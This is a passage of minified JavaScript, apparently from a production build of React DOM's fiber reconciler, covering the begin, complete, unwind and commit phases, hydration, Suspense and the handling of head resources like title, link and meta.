for(e=t.stateNode.containerInfo,e.nodeType===9?e=e.body:e=e.nodeName==="HTML"?e.ownerDocument.body:e,_e=zt(e.firstChild),Fe=t,me=!0,El=null,Dt=!0,l=Qu(t,null,a,l),t.child=l;l;)l.flags=l.flags&-3|4096,l=l.sibling;else{if(aa(),a===n){t=al(e,t,l);break e}$e(e,t,a,l)}t=t.child}return t;case 26:return Js(e,t),e===null?(l=hh(t.type,null,t.pendingProps,null))?t.memoizedState=l:me||(l=t.type,e=t.pendingProps,a=ho(re.current).createElement(l),a[We]=t,a[ot]=e,et(a,l,e),Ze(a),t.stateNode=a):t.memoizedState=hh(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return qt(t),e===null&&me&&(a=t.stateNode=uh(t.type,t.pendingProps,re.current),Fe=t,Dt=!0,n=_e,Bl(t.type)?(Qr=n,_e=zt(a.firstChild)):_e=n),$e(e,t,t.pendingProps.children,l),Js(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return e===null&&me&&((n=a=_e)&&(a=Ig(a,t.type,t.pendingProps,Dt),a!==null?(t.stateNode=a,Fe=t,_e=zt(a.firstChild),Dt=!1,n=!0):n=!1),n||Nl(t)),qt(t),n=t.type,s=t.pendingProps,c=e!==null?e.memoizedProps:null,a=s.children,qr(n,s)?a=null:c!==null&&qr(n,c)&&(t.flags|=32),t.memoizedState!==null&&(n=Gi(e,t,hg,null,null,l),Zn._currentValue=n),Js(e,t),$e(e,t,a,l),t.child;case 6:return e===null&&me&&((e=l=_e)&&(l=$g(l,t.pendingProps,Dt),l!==null?(t.stateNode=l,Fe=t,_e=null,e=!0):e=!1),e||Nl(t)),null;case 13:return Id(e,t,l);case 4:return Ke(t,t.stateNode.containerInfo),a=t.pendingProps,e===null?t.child=ca(t,null,a,l):$e(e,t,a,l),t.child;case 11:return Vd(e,t,t.type,t.pendingProps,l);case 7:return $e(e,t,t.pendingProps,l),t.child;case 8:return $e(e,t,t.pendingProps.children,l),t.child;case 12:return $e(e,t,t.pendingProps.children,l),t.child;case 10:return a=t.pendingProps,jl(t,t.type,a.value),$e(e,t,a.children,l),t.child;case 9:return n=t.type._context,a=t.pendingProps.children,sa(t),n=Ie(n),a=a(n),t.flags|=1,$e(e,t,a,l),t.child;case 14:return Pd(e,t,t.type,t.pendingProps,l);case 15:return Xd(e,t,t.type,t.pendingProps,l);case 19:return ef(e,t,l);case 31:return Sg(e,t,l);case 22:return Qd(e,t,l,t.pendingProps);case 24:return sa(t),a=Ie(qe),e===null?(n=Mi(),n===null&&(n=Re,s=wi(),n.pooledCache=s,s.refCount++,s!==null&&(n.pooledCacheLanes|=l),n=s),t.memoizedState={parent:a,cache:n},_i(t),jl(t,qe,n)):((e.lanes&l)!==0&&(zi(e,t),wn(t,null,null,l),Cn()),n=e.memoizedState,s=t.memoizedState,n.parent!==a?(n={parent:a,cache:a},t.memoizedState=n,t.lanes===0&&(t.memoizedState=t.updateQueue.baseState=n),jl(t,qe,a)):(a=s.cache,jl(t,qe,a),a!==n.cache&&Ci(t,[qe],l,!0))),$e(e,t,t.pendingProps.children,l),t.child;case 29:throw t.pendingProps}throw Error(r(156,t.tag))}function nl(e){e.flags|=4}function pr(e,t,l,a,n){if((t=(e.mode&32)!==0)&&(t=!1),t){if(e.flags|=16777216,(n&335544128)===n)if(e.stateNode.complete)e.flags|=8192;else if(Rf())e.flags|=8192;else throw ra=Os,Di}else e.flags&=-16777217}function lf(e,t){if(t.type!=="stylesheet"||(t.state.loading&4)!==0)e.flags&=-16777217;else if(e.flags|=16777216,!bh(t))if(Rf())e.flags|=8192;else throw ra=Os,Di}function Fs(e,t){t!==null&&(e.flags|=4),e.flags&16384&&(t=e.tag!==22?kc():536870912,e.lanes|=t,Qa|=t)}function On(e,t){if(!me)switch(e.tailMode){case"hidden":t=e.tail;for(var l=null;t!==null;)t.alternate!==null&&(l=t),t=t.sibling;l===null?e.tail=null:l.sibling=null;break;case"collapsed":l=e.tail;for(var a=null;l!==null;)l.alternate!==null&&(a=l),l=l.sibling;a===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:a.sibling=null}}function ze(e){var t=e.alternate!==null&&e.alternate.child===e.child,l=0,a=0;if(t)for(var n=e.child;n!==null;)l|=n.lanes|n.childLanes,a|=n.subtreeFlags&65011712,a|=n.flags&65011712,n.return=e,n=n.sibling;else for(n=e.child;n!==null;)l|=n.lanes|n.childLanes,a|=n.subtreeFlags,a|=n.flags,n.return=e,n=n.sibling;return e.subtreeFlags|=a,e.childLanes=l,t}function Tg(e,t,l){var a=t.pendingProps;switch(Ai(t),t.tag){case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ze(t),null;case 1:return ze(t),null;case 3:return l=t.stateNode,a=null,e!==null&&(a=e.memoizedState.cache),t.memoizedState.cache!==a&&(t.flags|=2048),el(qe),De(),l.pendingContext&&(l.context=l.pendingContext,l.pendingContext=null),(e===null||e.child===null)&&(za(t)?nl(t):e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,Ei())),ze(t),null;case 26:var n=t.type,s=t.memoizedState;return e===null?(nl(t),s!==null?(ze(t),lf(t,s)):(ze(t),pr(t,n,null,a,l))):s?s!==e.memoizedState?(nl(t),ze(t),lf(t,s)):(ze(t),t.flags&=-16777217):(e=e.memoizedProps,e!==a&&nl(t),ze(t),pr(t,n,e,a,l)),null;case 27:if(bl(t),l=re.current,n=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==a&&nl(t);else{if(!a){if(t.stateNode===null)throw Error(r(166));return ze(t),null}e=Y.current,za(t)?ku(t):(e=uh(n,a,l),t.stateNode=e,nl(t))}return ze(t),null;case 5:if(bl(t),n=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==a&&nl(t);else{if(!a){if(t.stateNode===null)throw Error(r(166));return ze(t),null}if(s=Y.current,za(t))ku(t);else{var c=ho(re.current);switch(s){case 1:s=c.createElementNS("http://www.w3.org/2000/svg",n);break;case 2:s=c.createElementNS("http://www.w3.org/1998/Math/MathML",n);break;default:switch(n){case"svg":s=c.createElementNS("http://www.w3.org/2000/svg",n);break;case"math":s=c.createElementNS("http://www.w3.org/1998/Math/MathML",n);break;case"script":s=c.createElement("div"),s.innerHTML="<script><\/script>",s=s.removeChild(s.firstChild);break;case"select":s=typeof a.is=="string"?c.createElement("select",{is:a.is}):c.createElement("select"),a.multiple?s.multiple=!0:a.size&&(s.size=a.size);break;default:s=typeof a.is=="string"?c.createElement(n,{is:a.is}):c.createElement(n)}}s[We]=t,s[ot]=a;e:for(c=t.child;c!==null;){if(c.tag===5||c.tag===6)s.appendChild(c.stateNode);else if(c.tag!==4&&c.tag!==27&&c.child!==null){c.child.return=c,c=c.child;continue}if(c===t)break e;for(;c.sibling===null;){if(c.return===null||c.return===t)break e;c=c.return}c.sibling.return=c.return,c=c.sibling}t.stateNode=s;e:switch(et(s,n,a),n){case"button":case"input":case"select":case"textarea":a=!!a.autoFocus;break e;case"img":a=!0;break e;default:a=!1}a&&nl(t)}}return ze(t),pr(t,t.type,e===null?null:e.memoizedProps,t.pendingProps,l),null;case 6:if(e&&t.stateNode!=null)e.memoizedProps!==a&&nl(t);else{if(typeof a!="string"&&t.stateNode===null)throw Error(r(166));if(e=re.current,za(t)){if(e=t.stateNode,l=t.memoizedProps,a=null,n=Fe,n!==null)switch(n.tag){case 27:case 5:a=n.memoizedProps}e[We]=t,e=!!(e.nodeValue===l||a!==null&&a.suppressHydrationWarning===!0||$f(e.nodeValue,l)),e||Nl(t,!0)}else e=ho(e).createTextNode(a),e[We]=t,t.stateNode=e}return ze(t),null;case 31:if(l=t.memoizedState,e===null||e.memoizedState!==null){if(a=za(t),l!==null){if(e===null){if(!a)throw Error(r(318));if(e=t.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(557));e[We]=t}else aa(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;ze(t),e=!1}else l=Ei(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=l),e=!0;if(!e)return t.flags&256?(St(t),t):(St(t),null);if((t.flags&128)!==0)throw Error(r(558))}return ze(t),null;case 13:if(a=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(n=za(t),a!==null&&a.dehydrated!==null){if(e===null){if(!n)throw Error(r(318));if(n=t.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(r(317));n[We]=t}else aa(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;ze(t),n=!1}else n=Ei(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=n),n=!0;if(!n)return t.flags&256?(St(t),t):(St(t),null)}return St(t),(t.flags&128)!==0?(t.lanes=l,t):(l=a!==null,e=e!==null&&e.memoizedState!==null,l&&(a=t.child,n=null,a.alternate!==null&&a.alternate.memoizedState!==null&&a.alternate.memoizedState.cachePool!==null&&(n=a.alternate.memoizedState.cachePool.pool),s=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(s=a.memoizedState.cachePool.pool),s!==n&&(a.flags|=2048)),l!==e&&l&&(t.child.flags|=8192),Fs(t,t.updateQueue),ze(t),null);case 4:return De(),e===null&&Hr(t.stateNode.containerInfo),ze(t),null;case 10:return el(t.type),ze(t),null;case 19:if(O(Be),a=t.memoizedState,a===null)return ze(t),null;if(n=(t.flags&128)!==0,s=a.rendering,s===null)if(n)On(a,!1);else{if(Le!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(s=Us(e),s!==null){for(t.flags|=128,On(a,!1),e=s.updateQueue,t.updateQueue=e,Fs(t,e),t.subtreeFlags=0,e=l,l=t.child;l!==null;)Mu(l,e),l=l.sibling;return B(Be,Be.current&1|2),me&&It(t,a.treeForkCount),t.child}e=e.sibling}a.tail!==null&&mt()>lo&&(t.flags|=128,n=!0,On(a,!1),t.lanes=4194304)}else{if(!n)if(e=Us(s),e!==null){if(t.flags|=128,n=!0,e=e.updateQueue,t.updateQueue=e,Fs(t,e),On(a,!0),a.tail===null&&a.tailMode==="hidden"&&!s.alternate&&!me)return ze(t),null}else 2*mt()-a.renderingStartTime>lo&&l!==536870912&&(t.flags|=128,n=!0,On(a,!1),t.lanes=4194304);a.isBackwards?(s.sibling=t.child,t.child=s):(e=a.last,e!==null?e.sibling=s:t.child=s,a.last=s)}return a.tail!==null?(e=a.tail,a.rendering=e,a.tail=e.sibling,a.renderingStartTime=mt(),e.sibling=null,l=Be.current,B(Be,n?l&1|2:l&1),me&&It(t,a.treeForkCount),e):(ze(t),null);case 22:case 23:return St(t),Li(),a=t.memoizedState!==null,e!==null?e.memoizedState!==null!==a&&(t.flags|=8192):a&&(t.flags|=8192),a?(l&536870912)!==0&&(t.flags&128)===0&&(ze(t),t.subtreeFlags&6&&(t.flags|=8192)):ze(t),l=t.updateQueue,l!==null&&Fs(t,l.retryQueue),l=null,e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(l=e.memoizedState.cachePool.pool),a=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(a=t.memoizedState.cachePool.pool),a!==l&&(t.flags|=2048),e!==null&&O(oa),null;case 24:return l=null,e!==null&&(l=e.memoizedState.cache),t.memoizedState.cache!==l&&(t.flags|=2048),el(qe),ze(t),null;case 25:return null;case 30:return null}throw Error(r(156,t.tag))}function Eg(e,t){switch(Ai(t),t.tag){case 1:return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return el(qe),De(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 26:case 27:case 5:return bl(t),null;case 31:if(t.memoizedState!==null){if(St(t),t.alternate===null)throw Error(r(340));aa()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 13:if(St(t),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(r(340));aa()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return O(Be),null;case 4:return De(),null;case 10:return el(t.type),null;case 22:case 23:return St(t),Li(),e!==null&&O(oa),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 24:return el(qe),null;case 25:return null;default:return null}}function af(e,t){switch(Ai(t),t.tag){case 3:el(qe),De();break;case 26:case 27:case 5:bl(t);break;case 4:De();break;case 31:t.memoizedState!==null&&St(t);break;case 13:St(t);break;case 19:O(Be);break;case 10:el(t.type);break;case 22:case 23:St(t),Li(),e!==null&&O(oa);break;case 24:el(qe)}}function kn(e,t){try{var l=t.updateQueue,a=l!==null?l.lastEffect:null;if(a!==null){var n=a.next;l=n;do{if((l.tag&e)===e){a=void 0;var s=l.create,c=l.inst;a=s(),c.destroy=a}l=l.next}while(l!==n)}}catch(h){Te(t,t.return,h)}}function _l(e,t,l){try{var a=t.updateQueue,n=a!==null?a.lastEffect:null;if(n!==null){var s=n.next;a=s;do{if((a.tag&e)===e){var c=a.inst,h=c.destroy;if(h!==void 0){c.destroy=void 0,n=t;var b=l,C=h;try{C()}catch(D){Te(n,b,D)}}}a=a.next}while(a!==s)}}catch(D){Te(t,t.return,D)}}function nf(e){var t=e.updateQueue;if(t!==null){var l=e.stateNode;try{Zu(t,l)}catch(a){Te(e,e.return,a)}}}function sf(e,t,l){l.props=da(e.type,e.memoizedProps),l.state=e.memoizedState;try{l.componentWillUnmount()}catch(a){Te(e,t,a)}}function Hn(e,t){try{var l=e.ref;if(l!==null){switch(e.tag){case 26:case 27:case 5:var a=e.stateNode;break;case 30:a=e.stateNode;break;default:a=e.stateNode}typeof l=="function"?e.refCleanup=l(a):l.current=a}}catch(n){Te(e,t,n)}}function Pt(e,t){var l=e.ref,a=e.refCleanup;if(l!==null)if(typeof a=="function")try{a()}catch(n){Te(e,t,n)}finally{e.refCleanup=null,e=e.alternate,e!=null&&(e.refCleanup=null)}else if(typeof l=="function")try{l(null)}catch(n){Te(e,t,n)}else l.current=null}function of(e){var t=e.type,l=e.memoizedProps,a=e.stateNode;try{e:switch(t){case"button":case"input":case"select":case"textarea":l.autoFocus&&a.focus();break e;case"img":l.src?a.src=l.src:l.srcSet&&(a.srcset=l.srcSet)}}catch(n){Te(e,e.return,n)}}function mr(e,t,l){try{var a=e.stateNode;Qg(a,e.type,l,t),a[ot]=t}catch(n){Te(e,e.return,n)}}function rf(e){return e.tag===5||e.tag===3||e.tag===26||e.tag===27&&Bl(e.type)||e.tag===4}function gr(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||rf(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.tag===27&&Bl(e.type)||e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function xr(e,t,l){var a=e.tag;if(a===5||a===6)e=e.stateNode,t?(l.nodeType===9?l.body:l.nodeName==="HTML"?l.ownerDocument.body:l).insertBefore(e,t):(t=l.nodeType===9?l.body:l.nodeName==="HTML"?l.ownerDocument.body:l,t.appendChild(e),l=l._reactRootContainer,l!=null||t.onclick!==null||(t.onclick=Jt));else if(a!==4&&(a===27&&Bl(e.type)&&(l=e.stateNode,t=null),e=e.child,e!==null))for(xr(e,t,l),e=e.sibling;e!==null;)xr(e,t,l),e=e.sibling}function Is(e,t,l){var a=e.tag;if(a===5||a===6)e=e.stateNode,t?l.insertBefore(e,t):l.appendChild(e);else if(a!==4&&(a===27&&Bl(e.type)&&(l=e.stateNode),e=e.child,e!==null))for(Is(e,t,l),e=e.sibling;e!==null;)Is(e,t,l),e=e.sibling}function cf(e){var t=e.stateNode,l=e.memoizedProps;try{for(var a=e.type,n=t.attributes;n.length;)t.removeAttributeNode(n[0]);et(t,a,l),t[We]=e,t[ot]=l}catch(s){Te(e,e.return,s)}}var sl=!1,Pe=!1,br=!1,uf=typeof WeakSet=="function"?WeakSet:Set,Je=null;function Ng(e,t){if(e=e.containerInfo,Br=yo,e=Su(e),di(e)){if("selectionStart"in e)var l={start:e.selectionStart,end:e.selectionEnd};else e:{l=(l=e.ownerDocument)&&l.defaultView||window;var a=l.getSelection&&l.getSelection();if(a&&a.rangeCount!==0){l=a.anchorNode;var n=a.anchorOffset,s=a.focusNode;a=a.focusOffset;try{l.nodeType,s.nodeType}catch{l=null;break e}var c=0,h=-1,b=-1,C=0,D=0,k=e,w=null;t:for(;;){for(var R;k!==l||n!==0&&k.nodeType!==3||(h=c+n),k!==s||a!==0&&k.nodeType!==3||(b=c+a),k.nodeType===3&&(c+=k.nodeValue.length),(R=k.firstChild)!==null;)w=k,k=R;for(;;){if(k===e)break t;if(w===l&&++C===n&&(h=c),w===s&&++D===a&&(b=c),(R=k.nextSibling)!==null)break;k=w,w=k.parentNode}k=R}l=h===-1||b===-1?null:{start:h,end:b}}else l=null}l=l||{start:0,end:0}}else l=null;for(Gr={focusedElem:e,selectionRange:l},yo=!1,Je=t;Je!==null;)if(t=Je,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,Je=e;else for(;Je!==null;){switch(t=Je,s=t.alternate,e=t.flags,t.tag){case 0:if((e&4)!==0&&(e=t.updateQueue,e=e!==null?e.events:null,e!==null))for(l=0;l<e.length;l++)n=e[l],n.ref.impl=n.nextImpl;break;case 11:case 15:break;case 1:if((e&1024)!==0&&s!==null){e=void 0,l=t,n=s.memoizedProps,s=s.memoizedState,a=l.stateNode;try{var X=da(l.type,n);e=a.getSnapshotBeforeUpdate(X,s),a.__reactInternalSnapshotBeforeUpdate=e}catch(te){Te(l,l.return,te)}}break;case 3:if((e&1024)!==0){if(e=t.stateNode.containerInfo,l=e.nodeType,l===9)Vr(e);else if(l===1)switch(e.nodeName){case"HEAD":case"HTML":case"BODY":Vr(e);break;default:e.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((e&1024)!==0)throw Error(r(163))}if(e=t.sibling,e!==null){e.return=t.return,Je=e;break}Je=t.return}}function df(e,t,l){var a=l.flags;switch(l.tag){case 0:case 11:case 15:il(e,l),a&4&&kn(5,l);break;case 1:if(il(e,l),a&4)if(e=l.stateNode,t===null)try{e.componentDidMount()}catch(c){Te(l,l.return,c)}else{var n=da(l.type,t.memoizedProps);t=t.memoizedState;try{e.componentDidUpdate(n,t,e.__reactInternalSnapshotBeforeUpdate)}catch(c){Te(l,l.return,c)}}a&64&&nf(l),a&512&&Hn(l,l.return);break;case 3:if(il(e,l),a&64&&(e=l.updateQueue,e!==null)){if(t=null,l.child!==null)switch(l.child.tag){case 27:case 5:t=l.child.stateNode;break;case 1:t=l.child.stateNode}try{Zu(e,t)}catch(c){Te(l,l.return,c)}}break;case 27:t===null&&a&4&&cf(l);case 26:case 5:il(e,l),t===null&&a&4&&of(l),a&512&&Hn(l,l.return);break;case 12:il(e,l);break;case 31:il(e,l),a&4&&pf(e,l);break;case 13:il(e,l),a&4&&mf(e,l),a&64&&(e=l.memoizedState,e!==null&&(e=e.dehydrated,e!==null&&(l=Og.bind(null,l),ex(e,l))));break;case 22:if(a=l.memoizedState!==null||sl,!a){t=t!==null&&t.memoizedState!==null||Pe,n=sl;var s=Pe;sl=a,(Pe=t)&&!s?rl(e,l,(l.subtreeFlags&8772)!==0):il(e,l),sl=n,Pe=s}break;case 30:break;default:il(e,l)}}function ff(e){var t=e.alternate;t!==null&&(e.alternate=null,ff(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&Zo(t)),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}var Oe=null,rt=!1;function ol(e,t,l){for(l=l.child;l!==null;)hf(e,t,l),l=l.sibling}function hf(e,t,l){if(gt&&typeof gt.onCommitFiberUnmount=="function")try{gt.onCommitFiberUnmount(sn,l)}catch{}switch(l.tag){case 26:Pe||Pt(l,t),ol(e,t,l),l.memoizedState?l.memoizedState.count--:l.stateNode&&(l=l.stateNode,l.parentNode.removeChild(l));break;case 27:Pe||Pt(l,t);var a=Oe,n=rt;Bl(l.type)&&(Oe=l.stateNode,rt=!1),ol(e,t,l),Xn(l.stateNode),Oe=a,rt=n;break;case 5:Pe||Pt(l,t);case 6:if(a=Oe,n=rt,Oe=null,ol(e,t,l),Oe=a,rt=n,Oe!==null)if(rt)try{(Oe.nodeType===9?Oe.body:Oe.nodeName==="HTML"?Oe.ownerDocument.body:Oe).removeChild(l.stateNode)}catch(s){Te(l,t,s)}else try{Oe.removeChild(l.stateNode)}catch(s){Te(l,t,s)}break;case 18:Oe!==null&&(rt?(e=Oe,sh(e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,l.stateNode),en(e)):sh(Oe,l.stateNode));break;case 4:a=Oe,n=rt,Oe=l.stateNode.containerInfo,rt=!0,ol(e,t,l),Oe=a,rt=n;break;case 0:case 11:case 14:case 15:_l(2,l,t),Pe||_l(4,l,t),ol(e,t,l);break;case 1:Pe||(Pt(l,t),a=l.stateNode,typeof a.componentWillUnmount=="function"&&sf(l,t,a)),ol(e,t,l);break;case 21:ol(e,t,l);break;case 22:Pe=(a=Pe)||l.memoizedState!==null,ol(e,t,l),Pe=a;break;default:ol(e,t,l)}}function pf(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null))){e=e.dehydrated;try{en(e)}catch(l){Te(t,t.return,l)}}}function mf(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null&&(e=e.dehydrated,e!==null))))try{en(e)}catch(l){Te(t,t.return,l)}}function jg(e){switch(e.tag){case 31:case 13:case 19:var t=e.stateNode;return t===null&&(t=e.stateNode=new uf),t;case 22:return e=e.stateNode,t=e._retryCache,t===null&&(t=e._retryCache=new uf),t;default:throw Error(r(435,e.tag))}}function $s(e,t){var l=jg(e);t.forEach(function(a){if(!l.has(a)){l.add(a);var n=kg.bind(null,e,a);a.then(n,n)}})}function ct(e,t){var l=t.deletions;if(l!==null)for(var a=0;a<l.length;a++){var n=l[a],s=e,c=t,h=c;e:for(;h!==null;){switch(h.tag){case 27:if(Bl(h.type)){Oe=h.stateNode,rt=!1;break e}break;case 5:Oe=h.stateNode,rt=!1;break e;case 3:case 4:Oe=h.stateNode.containerInfo,rt=!0;break e}h=h.return}if(Oe===null)throw Error(r(160));hf(s,c,n),Oe=null,rt=!1,s=n.alternate,s!==null&&(s.return=null),n.return=null}if(t.subtreeFlags&13886)for(t=t.child;t!==null;)gf(t,e),t=t.sibling}var Lt=null;function gf(e,t){var l=e.alternate,a=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:ct(t,e),ut(e),a&4&&(_l(3,e,e.return),kn(3,e),_l(5,e,e.return));break;case 1:ct(t,e),ut(e),a&512&&(Pe||l===null||Pt(l,l.return)),a&64&&sl&&(e=e.updateQueue,e!==null&&(a=e.callbacks,a!==null&&(l=e.shared.hiddenCallbacks,e.shared.hiddenCallbacks=l===null?a:l.concat(a))));break;case 26:var n=Lt;if(ct(t,e),ut(e),a&512&&(Pe||l===null||Pt(l,l.return)),a&4){var s=l!==null?l.memoizedState:null;if(a=e.memoizedState,l===null)if(a===null)if(e.stateNode===null){e:{a=e.type,l=e.memoizedProps,n=n.ownerDocument||n;t:switch(a){case"title":s=n.getElementsByTagName("title")[0],(!s||s[cn]||s[We]||s.namespaceURI==="http://www.w3.org/2000/svg"||s.hasAttribute("itemprop"))&&(s=n.createElement(a),n.head.insertBefore(s,n.querySelector("head > title"))),et(s,a,l),s[We]=e,Ze(s),a=s;break e;case"link":var c=gh("link","href",n).get(a+(l.href||""));if(c){for(var h=0;h<c.length;h++)if(s=c[h],s.getAttribute("href")===(l.href==null||l.href===""?null:l.href)&&s.getAttribute("rel")===(l.rel==null?null:l.rel)&&s.getAttribute("title")===(l.title==null?null:l.title)&&s.getAttribute("crossorigin")===(l.crossOrigin==null?null:l.crossOrigin)){c.splice(h,1);break t}}s=n.createElement(a),et(s,a,l),n.head.appendChild(s);break;case"meta":if(c=gh("meta","content",n).get(a+(l.content||""))){for(h=0;h<c.length;h++)if(s=c[h],s.getAttribute("content")===(l.content==null?null:""+l.content)&&s.getAttribute("name")===(l.name==null?null:l.name)&&s.getAttribute("property")===(l.property==null?null:l.property)&&s.getAttribute("http-equiv")===(l.httpEquiv==null?null:l.httpEquiv)&&s.getAttribute("charset")===(l.charSet==null?null:l.charSet)){c.splice(h,1);break t}}s=n.createElement(a),et(s,a,l),n.head.appendChild(s);break;default:throw Error(r(468,a))}s[We]=e,Ze(s),a=s}e.stateNode=a}else xh(n,e.type,e.stateNode);else e.stateNode=mh(n,a,e.memoizedProps);else s!==a?(s===null?l.stateNode!==null&&(l=l.stateNode,l.parentNode.removeChild(l)):s.count--,a===null?xh(n,e.type,e.stateNode):mh(n,a,e.memoizedProps)):a===null&&e.stateNode!==null&&mr(e,e.memoizedProps,l.memoizedProps)}break;case 27:ct(t,e),ut(e),a&512&&(Pe||l===null||Pt(l,l.return)),l!==null&&a&4&&mr(e,e.memoizedProps,l.memoizedProps);break;case 5:if(ct(t,e),ut(e),a&512&&(Pe||l===null||Pt(l,l.return)),e.flags&32){n=e.stateNode;try{Ta(n,"")}catch(X){Te(e,e.return,X)}}a&4&&e.stateNode!=null&&(n=e.memoizedProps,mr(e,n,l!==null?l.memoizedProps:n)),a&1024&&(br=!0);break;case 6:if(ct(t,e),ut(e),a&4){if(e.stateNode===null)throw Error(r(162));a=e.memoizedProps,l=e.stateNode;try{l.nodeValue=a}catch(X){Te(e,e.return,X)}}break;case 3:if(go=null,n=Lt,Lt=po(t.containerInfo),ct(t,e),Lt=n,ut(e),a&4&&l!==null&&l.memoizedState.isDehydrated)try{en(t.containerInfo)}catch(X){Te(e,e.return,X)}br&&(br=!1,xf(e));break;case 4:a=Lt,Lt=po(e.stateNode.containerInfo),ct(t,e),ut(e),Lt=a;break;case 12:ct(t,e),ut(e);break;case 31:ct(t,e),ut(e),a&4&&(a=e.updateQueue,a!==null&&(e.updateQueue=null,$s(e,a)));break;case 13:ct(t,e),ut(e),e.child.flags&8192&&e.memoizedState!==null!=(l!==null&&l.memoizedState!==null)&&(to=mt()),a&4&&(a=e.updateQueue,a!==null&&(e.updateQueue=null,$s(e,a)));break;case 22:n=e.memoizedState!==null;var b=l!==null&&l.memoizedState!==null,C=sl,D=Pe;if(sl=C||n,Pe=D||b,ct(t,e),Pe=D,sl=C,ut(e),a&8192)e:for(t=e.stateNode,t._visibility=n?t._visibility&-2:t._visibility|1,n&&(l===null||b||sl||Pe||fa(e)),l=null,t=e;;){if(t.tag===5||t.tag===26){if(l===null){b=l=t;try{if(s=b.stateNode,n)c=s.style,typeof c.setProperty=="function"?c.setProperty("display","none","important"):c.display="none";else{h=b.stateNode;var k=b.memoizedProps.style,w=k!=null&&k.hasOwnProperty("display")?k.display:null;h.style.display=w==null||typeof w=="boolean"?"":(""+w).trim()}}catch(X){Te(b,b.return,X)}}}else if(t.tag===6){if(l===null){b=t;try{b.stateNode.nodeValue=n?"":b.memoizedProps}catch(X){Te(b,b.return,X)}}}else if(t.tag===18){if(l===null){b=t;try{var R=b.stateNode;n?oh(R,!0):oh(b.stateNode,!1)}catch(X){Te(b,b.return,X)}}}else if((t.tag!==22&&t.tag!==23||t.memoizedState===null||t===e)&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;l===t&&(l=null),t=t.return}l===t&&(l=null),t.sibling.return=t.return,t=t.sibling}a&4&&(a=e.updateQueue,a!==null&&(l=a.retryQueue,l!==null&&(a.retryQueue=null,$s(e,l))));break;case 19:ct(t,e),ut(e),a&4&&(a=e.updateQueue,a!==null&&(e.updateQueue=null,$s(e,a)));break;case 30:break;case 21:break;default:ct(t,e),ut(e)}}function ut(e){var t=e.flags;if(t&2){try{for(var l,a=e.return;a!==null;){if(rf(a)){l=a;break}a=a.return}if(l==null)throw Error(r(160));switch(l.tag){case 27:var n=l.stateNode,s=gr(e);Is(e,s,n);break;case 5:var c=l.stateNode;l.flags&32&&(Ta(c,""),l.flags&=-33);var h=gr(e);Is(e,h,c);break;case 3:case 4:var b=l.stateNode.containerInfo,C=gr(e);xr(e,C,b);break;default:throw Error(r(161))}}catch(D){Te(e,e.return,D)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function xf(e){if(e.subtreeFlags&1024)for(e=e.child;e!==null;){var t=e;xf(t),t.tag===5&&t.flags&1024&&t.stateNode.reset(),e=e.sibling}}function il(e,t){if(t.subtreeFlags&8772)for(t=t.child;t!==null;)df(e,t.alternate,t),t=t.sibling}function fa(e){for(e=e.child;e!==null;){var t=e;switch(t.tag){case 0:case 11:case 14:case 15:_l(4,t,t.return),fa(t);break;case 1:Pt(t,t.return);var l=t.stateNode;typeof l.componentWillUnmount=="function"&&sf(t,t.return,l),fa(t);break;case 27:Xn(t.stateNode);case 26:case 5:Pt(t,t.return),fa(t);break;case 22:t.memoizedState===null&&fa(t);break;case 30:fa(t);break;default:fa(t)}e=e.sibling}}function rl(e,t,l){for(l=l&&(t.subtreeFlags&8772)!==0,t=t.child;t!==null;){var a=t.alternate,n=e,s=t,c=s.flags;switch(s.tag){case 0:case 11:case 15:rl(n,s,l),kn(4,s);break;case 1:if(rl(n,s,l),a=s,n=a.stateNode,typeof n.componentDidMount=="function")try{n.componentDidMount()}catch(C){Te(a,a.return,C)}if(a=s,n=a.updateQueue,n!==null){var h=a.stateNode;try{var 